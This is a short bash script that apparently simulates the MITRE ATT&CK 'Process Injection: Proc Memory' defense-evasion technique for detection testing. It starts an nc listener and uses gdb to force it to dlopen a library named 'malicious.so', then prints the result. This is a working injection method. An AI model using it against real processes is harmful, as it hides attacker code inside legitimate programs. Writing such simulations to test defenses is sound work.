#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# proc memory technique
echo -e "\n${YELLOW}>>> [Defense Evasion] Process Injection: Proc Memory Technique ${RESET}"
echo "Let's simulate the case when an attacker injects malicious code into the process"

echo "Trying inject malicious.so library into the process nc ... "

nc -lp 4444 > /dev/null & pid=$! 
sleep 1
error=$(gdb -batch-silent -p $pid -ex 'call (void*) dlopen("/opt/mitre/07 Defense Evasion/malicious.so", 1)' -ex 'detach' -ex 'quit' 2>&1)

if [[ -n "$error" ]]; then
        echo -e "${RED}Error! Injection of malicious code was failed: ${error} ${RESET}"
    else
        echo -e "${GREEN}Success! Malicious code was injected ${RESET}"
fi

# Stop the background nc so the script can exit (bash waits for background jobs otherwise)
kill $pid 2>/dev/null || true
